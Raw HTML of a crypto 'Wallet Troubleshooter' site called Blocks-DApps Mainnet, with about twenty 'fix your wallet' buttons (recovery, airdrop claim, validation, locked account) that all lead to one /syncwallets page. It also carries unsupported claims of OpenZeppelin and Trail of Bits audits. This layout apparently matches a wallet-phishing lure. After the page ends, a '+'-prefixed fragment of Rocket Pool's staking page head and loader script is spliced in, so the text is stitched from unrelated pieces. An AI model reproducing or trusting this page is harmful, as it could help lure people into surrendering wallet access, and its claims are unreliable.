1.825-1.136.418-2.492.628-4.067.628zm19.057-1.017c-.459.339-1.027.598-1.705.778a8.888 8.888 0 01-2.093.239c-1.914 0-3.399-.489-4.456-1.466-1.037-.977-1.555-2.412-1.555-4.306v-6.609h-2.482v-3.589h2.482V22.18h4.665v3.917h4.007v3.59h-4.007v6.548c0 .678.17 1.206.508 1.585.359.359.858.539 1.496.539.737 0 1.365-.2 1.884-.599l1.256 3.29zm39.467-20.156l-6.848 20.934h-5.203l-4.606-14.175-4.755 14.175h-5.173l-6.878-20.934h5.024l4.725 14.713 4.934-14.713h4.485l4.785 14.833 4.875-14.833h4.635zm5.873 4.605c2.492 0 4.406.598 5.742 1.795 1.336 1.176 2.003 2.96 2.003 5.353v9.18h-4.366v-2.003c-.876 1.495-2.511 2.243-4.904 2.243-1.236 0-2.312-.21-3.23-.629-.897-.418-1.585-.996-2.063-1.734-.479-.738-.718-1.575-.718-2.512 0-1.495.559-2.671 1.675-3.529 1.136-.857 2.881-1.285 5.233-1.285h3.709c0-1.017-.31-1.795-.928-2.333-.618-.558-1.545-.838-2.781-.838a7.99 7.99 0 00-2.542.42c-.817.259-1.515.617-2.093 1.076l-1.675-3.26c.877-.618 1.924-1.096 3.14-1.435a14.287 14.287 0 013.798-.509zm-.359 13.427c.798 0 1.506-.179 2.124-.538.618-.378 1.056-.926 1.316-1.644v-1.645h-3.201c-1.913 0-2.87.628-2.87 1.884 0 .598.229 1.076.687 1.435.479.339 1.127.508 1.944.508zm10.533-19.288h4.664v22.19h-4.664v-22.19zm7.2 0h4.665v22.19h-4.665v-22.19zm22.96 14.205c0 .06-.029.479-.09 1.256h-12.171c.22.997.738 1.784 1.555 2.363.818.577 1.834.866 3.051.866.837 0 1.575-.12 2.213-.358a5.546 5.546 0 001.823-1.196l2.483 2.69c-1.515 1.735-3.728 2.603-6.639 2.603-1.814 0-3.419-.35-4.815-1.047-1.395-.718-2.472-1.705-3.229-2.96-.758-1.257-1.137-2.682-1.137-4.277 0-1.575.369-2.99 1.107-4.247a7.853 7.853 0 013.08-2.96c1.316-.718 2.781-1.077 4.396-1.077 1.575 0 3.001.34 4.276 1.017a7.305 7.305 0 012.991 2.93c.737 1.257 1.106 2.722 1.106 4.397zm-8.343-4.815c-1.057 0-1.944.299-2.661.898-.719.598-1.157 1.415-1.317 2.452h7.925c-.159-1.017-.598-1.825-1.316-2.423-.717-.618-1.595-.927-2.631-.927zm20.031 12.022c-.458.339-1.026.598-1.704.778a8.882 8.882 0 01-2.093.239c-1.914 0-3.399-.489-4.456-1.466-1.037-.977-1.555-2.412-1.555-4.306v-6.609h-2.482v-3.589h2.482V22.18h4.665v3.917h4.008v3.59h-4.008v6.548c0 .678.169 1.206.508 1.585.359.359.857.539 1.496.539.737 0 1.365-.2 1.884-.599l1.255 3.29z" fill="#fff"></path></svg></div><div class="flex items-center justify-center"><svg width="150" height="48" viewBox="0 0 183 49" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg"><path d="M34.218 24.2212L48.4273 38.4305H43.3994C42.5523 38.4305 41.7052 38.0752 41.104 37.4741L27.9058 24.2212L41.1587 10.941C41.7599 10.3398 42.5796 9.98459 43.454 10.0119H48.4273L34.218 24.2212ZM8.17678 10.941C7.57562 10.3398 6.75585 9.98459 5.88143 10.0119H0.880859L15.0901 24.2212L0.880859 38.4305H5.90876C6.75585 38.4305 7.60294 38.0752 8.2041 37.4741L21.4297 24.1939L8.17678 10.941ZM24.6541 27.4729L11.3739 40.7258C10.7727 41.327 10.4448 42.1467 10.4448 43.0212V48.0217L24.6541 33.8125L38.8634 48.0217V42.9938C38.8634 42.1467 38.5354 41.2997 37.9343 40.6985L24.6541 27.4729ZM24.6541 20.9695L37.9343 7.71657C38.5354 7.11541 38.8634 6.29564 38.8634 5.42123V0.420654L24.6541 14.6299L10.4448 0.420654V5.42123C10.4448 6.26832 10.7727 7.11541 11.3739 7.71657L24.6541 20.9695Z" fill="url(#paint0_linear_307_127)"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M154.7 7.32032V36.5313C154.673 36.9958 154.864 37.4604 155.192 37.8156C155.52 38.1708 155.985 38.3621 156.449 38.3621H156.968C157.46 38.3621 157.925 38.1708 158.253 37.8156C158.58 37.4604 158.772 36.9958 158.772 36.5313V7.32032H162.16V37.2964C162.16 39.5645 160.357 41.3953 158.089 41.4499H155.493C154.372 41.4499 153.307 41.04 152.514 40.2476C151.722 39.4551 151.285 38.4168 151.285 37.2964V7.32032H154.7ZM178.801 6.99241C181.069 7.04706 182.9 9.17846 182.9 11.4738V14.179C182.9 14.5616 182.654 14.8895 182.272 14.9988L179.457 15.7912V11.911C179.457 10.9273 178.637 10.1075 177.654 10.1075C176.67 10.1075 175.85 10.9 175.85 11.911V15.1354C175.85 17.1302 177.326 19.6715 177.326 19.6715L181.37 27.4592C183.01 30.547 182.873 32.815 182.873 32.815V37.1325C182.873 38.2528 182.436 39.3458 181.643 40.1656C180.851 40.9854 179.758 41.4226 178.61 41.4499H176.479C174.183 41.3133 172.38 39.4278 172.38 37.1325V32.2959C172.38 31.9133 172.626 31.5854 173.008 31.4761L175.823 30.6837V36.586C175.823 37.5697 176.643 38.3621 177.654 38.3621C178.637 38.3621 179.457 37.5424 179.43 36.5313V32.6784C179.43 30.711 177.954 28.0877 177.954 28.0877L173.965 20.2999C172.325 17.2122 172.462 14.9441 172.462 14.9441V11.4738C172.462 9.12381 174.347 6.99241 176.725 6.99241H178.801ZM114.832 6.99241C117.128 7.10172 118.931 9.0145 118.931 11.3098V37.2418C118.904 39.5098 117.1 41.3679 114.832 41.4772H112.236C109.914 41.4499 108.028 39.5644 108.001 37.2418V11.2825C108.001 10.1622 108.438 9.06915 109.231 8.24939C110.023 7.42962 111.116 6.99241 112.264 6.96509L114.832 6.99241ZM75.8934 7.32032L75.0736 10.1622C74.9643 10.5447 74.6364 10.7907 74.2539 10.7907H68.8161V21.6662H74.4452L73.6254 24.5081C73.5161 24.8633 73.1882 25.1366 72.8056 25.1366H68.8161V37.679H75.8934L75.101 40.4935C74.9917 40.8761 74.6638 41.122 74.2812 41.122H65.4277V7.32032H75.8934ZM136.31 7.32032C138.66 7.34765 140.518 9.23311 140.518 11.5558V36.8592C140.518 39.1819 138.633 41.0947 136.31 41.0947H129.752V7.32032H136.31ZM91.6602 18.1959L94.7754 7.32032H98.2457L93.4091 24.2348L98.273 41.1493H94.8027L91.6602 30.2464L88.5451 41.122H85.0748L89.9114 24.2348L85.0475 7.32032H88.5178L91.6602 18.1959ZM113.685 38.4168C114.176 38.4168 114.641 38.1982 114.969 37.8429C115.297 37.4877 115.488 37.0232 115.461 36.5313V11.911C115.488 11.4191 115.297 10.9546 114.969 10.5994C114.641 10.2442 114.176 10.0529 113.685 10.0255H113.165C112.154 10.0802 111.362 10.9 111.362 11.911V36.5313C111.362 37.5424 112.154 38.3621 113.165 38.4168H113.685ZM135.354 37.7063C136.31 37.7063 137.157 37.2145 137.157 35.9028V12.5395C137.157 11.2825 136.31 10.7907 135.354 10.7907H133.14V37.7063H135.354Z" fill="#fff"></path><defs><linearGradient id="paint0_linear_307_127" x1="0.865005" y1="24.2161" x2="30.9282" y2="24.2161" gradientUnits="userSpaceOnUse"><stop stop-color="#00BFFF"></stop><stop offset="1" stop-color="#6619FF"></stop></linearGradient></defs></svg></div></div></div></div></div></div><section class="bg-[#2c5241] py-20" id="about"><div class="max-w-7xl mx-auto px-4"><h2 class="text-4xl md:text-5xl lg:text-6xl font-bold text-white text-center mb-16">About the platform</h2><div class="grid md:grid-cols-2 gap-12 items-center"><div class="space-y-6"><span class="text-emerald-500 font-medium">SYNC AND TRACK</span><h3 class="text-3xl md:text-4xl font-bold text-white">Fully decentralized. Completely secure.</h3><p class="text-gray-300 text-lg leading-relaxed">We have all been in this industry too long not to make the security of your funds our absolute top priority. We've received multiple audits from Open Zeppelin and Trail of Bits, as well as code reviews from white hat researchers.</p><div class="grid sm:grid-cols-2 gap-8 pt-8"><div class="space-y-2"><div class="text-4xl font-bold text-white">10,834</div><div class="text-gray-300">Accounts Successfully Rectified.</div></div><div class="space-y-2"><div class="text-4xl font-bold text-white">4,500+</div><div class="text-gray-300">Collections Indexed every 5mins.</div></div></div></div></div></div></section><section class="bg-[#2c5241] py-24" id="roadmap"><div class="max-w-7xl mx-auto px-4"><h2 class="text-4xl md:text-5xl font-bold text-white text-center mb-16">Blocks-DApps Mainnet's Roadmap</h2><div class="relative space-y-8"><div class="flex justify-start"><div class="w-full max-w-xl relative"><div class="bg-[#ffffff0d] rounded-lg p-8 relative"><div class="absolute -top-3 -right-3 bg-emerald-500 text-white rounded-full w-12 h-12 flex items-center justify-center font-medium">0%</div><div class="text-emerald-500 font-medium mb-4">STEP <!-- -->01</div><h3 class="text-2xl font-bold text-white mb-4">Objective</h3><p class="text-gray-300 leading-relaxed">Our team of experts will help you investigate and identify the problem to ensure your funds and transactions remain secure and hassle-free.</p></div></div></div><div class="flex justify-end"><div class="w-full max-w-xl relative"><div class="bg-[#ffffff0d] rounded-lg p-8 relative"><div class="absolute -top-3 -right-3 bg-emerald-500 text-white rounded-full w-12 h-12 flex items-center justify-center font-medium">25%</div><div class="text-emerald-500 font-medium mb-4">STEP <!-- -->02</div><h3 class="text-2xl font-bold text-white mb-4">Connect Wallet</h3><p class="text-gray-300 leading-relaxed">Unlock the full potential of our decentralized application with a quick and secure wallet connection.</p></div></div></div><div class="flex justify-start"><div class="w-full max-w-xl relative"><div class="bg-[#ffffff0d] rounded-lg p-8 relative"><div class="absolute -top-3 -right-3 bg-emerald-500 text-white rounded-full w-12 h-12 flex items-center justify-center font-medium">50%</div><div class="text-emerald-500 font-medium mb-4">STEP <!-- -->03</div><h3 class="text-2xl font-bold text-white mb-4">Validation</h3><p class="text-gray-300 leading-relaxed">We methodically verify and validate the authenticity of your wallet, safeguarding your cryptocurrency and digital holdings against unauthorized access.</p></div></div></div><div class="flex justify-end"><div class="w-full max-w-xl relative"><div class="bg-[#ffffff0d] rounded-lg p-8 relative"><div class="absolute -top-3 -right-3 bg-emerald-500 text-white rounded-full w-12 h-12 flex items-center justify-center font-medium">75%</div><div class="text-emerald-500 font-medium mb-4">STEP <!-- -->04</div><h3 class="text-2xl font-bold text-white mb-4">Troubleshoot</h3><p class="text-gray-300 leading-relaxed">We specialize in troubleshooting, diagnosing, and fixing wallet-related problems swiftly and efficiently, ensuring your financial assets stay safe and accessible.</p></div></div></div><div class="flex justify-start"><div class="w-full max-w-xl relative"><div class="bg-[#ffffff0d] rounded-lg p-8 relative"><div class="absolute -top-3 -right-3 bg-emerald-500 text-white rounded-full w-12 h-12 flex items-center justify-center font-medium">100%</div><div class="text-emerald-500 font-medium mb-4">STEP <!-- -->05</div><h3 class="text-2xl font-bold text-white mb-4">Optimized</h3><p class="text-gray-300 leading-relaxed">Tool to maximize your wallet's functionality, allowing you to manage and exchange your funds with deep-set confidence.</p></div></div></div></div></div></section><div class="mt-3 flex flex-col justify-center bg-[#2c5241]"><h1 class="text-center text-white text-[36px]">Get Started Below.</h1><div class="mt-4 flex flex-col gap-4 lg:flex-row flex-wrap lg:pl-10 "><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">MIGRATION</h4><p class="text-[18px] font-[400] text-white text-center">Click here for migration or to resolve any migration related issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">RECTIFICATION</h4><p class="text-[18px] font-[400] text-white text-center">Click here to rectify all strange wallet issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">CLAIM</h4><p class="text-[18px] font-[400] text-white text-center">Click here to claim tokens or resolve any token claiming related issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">SWAP</h4><p class="text-[18px] font-[400] text-white text-center">Click here to swap tokens or resolve issues related to token swap.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">SLIPPAGE</h4><p class="text-[18px] font-[400] text-white text-center">Click here for slippage or transaction fee related issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">CLAIM AIRDROP</h4><p class="text-[18px] font-[400] text-white text-center">Click here to claim airdrop or resolve errors encountered during airdrop claim.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">STAKING</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve issues encountered while staking/unstaking.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">WHITELIST</h4><p class="text-[18px] font-[400] text-white text-center">Click here to whitelist your address or resolve whitelisting related error.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">CROSS TRANSFER</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve cross bridging errors encountered during cross transfer.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">NFTs</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve NFT related issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">LOCKED ACCOUNT</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve locked account or wallet stuck issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">LOGIN ERROR</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve errors encountered during login.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">WALLET GLITCH</h4><p class="text-[18px] font-[400] text-white text-center">Click here to resolve wallet issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">DEFI FARMING</h4><p class="text-[18px] font-[400] text-white text-center">Click here for DeFi or Commercial farming related issues.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">VALIDATION</h4><p class="text-[18px] font-[400] text-white text-center">Click here to validate your wallet via Multisig.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">TRANSACTION DELAY</h4><p class="text-[18px] font-[400] text-white text-center">Click here for any transaction related error.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">MISSING/IRREGULAR BALANCE</h4><p class="text-[18px] font-[400] text-white text-center">Click here to recover lost or missing funds.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">RECOVERY</h4><p class="text-[18px] font-[400] text-white text-center">Click here for wallet recovery.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">BUY TOKEN/COIN</h4><p class="text-[18px] font-[400] text-white text-center">Click here to trade. Your account has to be marked as a trusted payment source to start trading.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">EXCHANGE</h4><p class="text-[18px] font-[400] text-white text-center">Click here for token exchange or to resolve errors encountered during token exchange.</p></div></a><a href="/syncwallets"><div class="p-[24px] bg-emerald-500 text-white text-emerald-500   rounded-[10px] flex-grow-0 lg:w-[240px] flex items-center flex-col gap-3 hover:border-[1px] hover:border-[#01EEA0] shadow-lg"><h4 class="text-[1.25rem] text-white font-[700]">BRIDGING</h4><p class="text-[18px] font-[400] text-white text-center">Click here to bridge tokens or resolve bridging related issues.</p></div></a></div></div><div class="mt-4 pb-8 bg-[#2c5241]" id="faq"><div class="mycontainer navConn"><div class="px-4"><h2 class="text-center text-[32px] lg:text-[64px] font-bold gradient-text">FAQ</h2><p class="text-center text-customGray-main text-[18px]">Here are some of our most frequently asked questions.</p><div class="mt-8 flex flex-col gap-4"><div class="bg-[#ffffff0d] rounded-[10px] p-4 cursor-pointer"><div class="text-xl font-medium text-white flex justify-between items-center">What is Blocks-DApps Mainnet?<span>▼</span></div><div class="transition-all duration-300 ease-in-out overflow-hidden max-h-0 opacity-0"><p class="text-customGray-main font-[400] pt-2">Blocks-DApps Mainnet is a platform designed to address common issues faced by Web3 applications, such as scalability, interoperability, and user adoption. We focus on creating a secure and efficient environment for decentralized applications to thrive.</p></div></div><div class="bg-[#ffffff0d] rounded-[10px] p-4 cursor-pointer"><div class="text-xl font-medium text-white flex justify-between items-center">How does BlocksDApps Mainnet ensure the security of my funds?<span>▼</span></div><div class="transition-all duration-300 ease-in-out overflow-hidden max-h-0 opacity-0"><p class="text-customGray-main font-[400] pt-2">We prioritize the security of your funds above all else. Blocks-DApps Mainnet has undergone multiple audits from renowned security firms such as Open Zeppelin and Trail of Bits. Additionally, our code has been reviewed by white hat researchers to ensure robust security measures are in place.</p></div></div><div class="bg-[#ffffff0d] rounded-[10px] p-4 cursor-pointer"><div class="text-xl font-medium text-white flex justify-between items-center">How is the platform governed?<span>▼</span></div><div class="transition-all duration-300 ease-in-out overflow-hidden max-h-0 opacity-0"><p class="text-customGray-main font-[400] pt-2">Blocks-DApps Mainnet is designed to be governed by the community. Unlike centralized authorities, we believe in democracy and user participation. Community members can propose and vote on various aspects of the platform, ensuring that it evolves according to the users' needs and preferences.</p></div></div><div class="bg-[#ffffff0d] rounded-[10px] p-4 cursor-pointer"><div class="text-xl font-medium text-white flex justify-between items-center">How can I earn high yields on Blocks-DApps Mainnet?<span>▼</span></div><div class="transition-all duration-300 ease-in-out overflow-hidden max-h-0 opacity-0"><p class="text-customGray-main font-[400] pt-2">You can passively earn high yields by providing liquidity on our platform. This enables you to earn trade fees and FST rewards, maximizing your earnings while contributing to the platform's liquidity.</p></div></div><div class="bg-[#ffffff0d] rounded-[10px] p-4 cursor-pointer"><div class="text-xl font-medium text-white flex justify-between items-center">Can I get leveraged exposure on my favorite crypto assets?<span>▼</span></div><div class="transition-all duration-300 ease-in-out overflow-hidden max-h-0 opacity-0"><p class="text-customGray-main font-[400] pt-2">Yes, you can! If you gather enough support from the Blocks-DApps Mainnet community, the protocol will automatically add the desired crypto asset as an exchange option, allowing leveraged exposure.</p></div></div></div></div></div></div></div></div><script src="/_next/static/chunks/webpack-79ecfd49d06ff6b0.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/d6ea71070c5fcc60-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/1e94ac571796fa71.css\",\"style\"]\n3:HL[\"/_next/static/css/a8003e953fafd7a8.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"4:I[5751,[],\"\"]\n6:I[563,[\"974\",\"static/chunks/974-f4b6abb074fdc10c.js\",\"931\",\"static/chunks/app/page-abb83ec96df195a0.js\"],\"default\"]\n7:I[9275,[],\"\"]\n8:I[1343,[],\"\"]\na:I[6130,[],\"\"]\nb:[]\n"])</script><script>self.__next_f.push([1,"0:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/1e94ac571796fa71.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],[\"$\",\"$L4\",null,{\"buildId\":\"kT2J9IdBzO0-5XV--pvHj\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/\",\"initialTree\":[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"__PAGE__\",{},[[\"$L5\",[\"$\",\"div\",null,{\"children\":[\"$\",\"$L6\",null,{}]}]],null],null]},[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__className_de9c82\",\"children\":[\"$\",\"$L7\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[],\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/a8003e953fafd7a8.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]]}]}]}],null],null],\"couldBeIntercepted\":false,\"initialHead\":[false,\"$L9\"],\"globalErrorComponent\":\"$a\",\"missingSlots\":\"$Wb\"}]]\n"])</script><script>self.__next_f.push([1,"9:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"DApps | Wallet Troubleshooter\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"DApps | Wallet Troubleshooter\"}],[\"$\",\"meta\",\"4\",{\"name\":\"next-size-adjust\"}]]\n5:null\n"])</script><next-route-announcer style="position: absolute;"></next-route-announcer></body></html>
+      </script><base href="https://stake.rocketpool.net/"><meta name="viewport" content="width=device-width,initial-scale=1, height=482"><meta name="format-detection" content="telephone=no"><meta name="author" content="Rocket Pool"><meta name="description" content="Rocket Pool is a decentralised staking protocol providing liquid &amp; node staking products for the Ethereum (ETH) ecosystem."><meta property="og:url" content="https://rocketpool.net"><meta property="og:type" content="website"><meta property="og:title" content="Rocket Pool - Decentralised Ethereum Liquid Staking Protocol"><meta property="og:description" content="Your friendly decentralised Ethereum liquid staking protocol"><meta property="og:image" content="https://rocketpool.net/files/rp-logo-200x200.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@rocket_pool"><meta name="twitter:creator" content="@rocket_pool"><meta name="twitter:title" content="Rocket Pool - Decentralised Ethereum Liquid Staking Protocol"><meta name="twitter:description" content="Your friendly decentralised Ethereum liquid staking protocol"><meta name="twitter:image" content="https://rocketpool.net/files/twitter-summary-large.png"><link rel="preconnect" href="https://api.rocketpool.net/"><link rel="dns-prefetch" href="https://api.rocketpool.net/"><link rel="dns-prefetch" href="https://static.cloudflareinsights.com/"><link rel="preconnect" href="https://static.cloudflareinsights.com/"><link rel="icon" type="image/png" href="/favicon-32x32.png"><link rel="apple-touch-icon" type="image/png" href="/favicon-180x180.png"><style>body{display:none}@font-face{font-display:swap;font-family:Inter;font-style:normal;font-weight:500;src:url("/inter-v13-latin-500.woff2") format("woff2")}@font-face{font-display:swap;font-family:Poppins;font-style:normal;font-weight:600;src:url("/poppins-v20-latin-600.woff2") format("woff2")}</style><title>Stake - Rocket Pool</title><script data-rsbuild-assets-retry="inline">!function(){"use strict";function e(e,n){for(var t=n.domain,r=0;r<t.length;r++){var a=t[r];if(-1!==e.indexOf(a))return a}return window.origin}var n=/[?#].*$/;function t(e,n){return null!=n&&"undefined"!=typeof Symbol&&n[Symbol.hasInstance]?!!n[Symbol.hasInstance](e):e instanceof n}var r={link:HTMLLinkElement,script:HTMLScriptElement,img:HTMLImageElement};function a(n,a){var i=a.target,o=i.tagName.toLocaleLowerCase(),c=t(i,HTMLScriptElement)||t(i,HTMLImageElement)?i.src:t(i,HTMLLinkElement)?i.href:null;if(!c)return!1;var s=Number(i.dataset.rbRuleI||"-1"),l=n[s]||function(n,t,r){for(var a=0;a<r.length;a++){var i,o=r[a],c=o.test,s=!0;if((null!=(i=RegExp)&&"undefined"!=typeof Symbol&&i[Symbol.hasInstance]?i[Symbol.hasInstance](c):c instanceof i)?s=c.test(n):"string"==typeof c?s=new RegExp(c).test(n):"function"==typeof c&&(s=c(n)),o.domain&&o.domain.length>0){var l=e(n,o);o.domain.includes(l)||(s=!1)}if(o.type&&o.type.length>0&&!o.type.includes(t)&&(s=!1),s)return o}return null}(c,o,n);if(!l)return!1;s=n.indexOf(l);var u=l.type;return!!o&&-1!==u.indexOf(o)&&!!r[o]&&!!t(i,r[o])&&{target:i,tagName:o,url:c,rule:l,ruleIndex:s}}function i(e,n,r){t(e,HTMLScriptElement)&&(r.isAsync?document.body.appendChild(n.element):console.warn("[@rsbuild/plugin-assets-retry] ","load sync script failed, for security only async/defer script can be retried",e)),t(e,HTMLLinkElement)&&document.getElementsByTagName("head")[0].appendChild(n.element),t(e,HTMLImageElement)&&(e.src=r.url,e.dataset.rbRetryTimes=r.times+"",e.dataset.rbOriginalQuery=r.originalQuery+"")}"undefined"==typeof window||window.__RB_ASYNC_CHUNKS__||(window.__RB_ASYNC_CHUNKS__={});try{var o=[{max:3,type:["link","script","img"],domain:[],crossOrigin:!1,delay:0,addQuery:!1}];"undefined"!=typeof window&&void 0!==window.document&&(document.addEventListener("error",(function(r){if(r&&t(r.target,Element))try{!function(r,o){var c,s=a(r,o);if(!1!==s){var 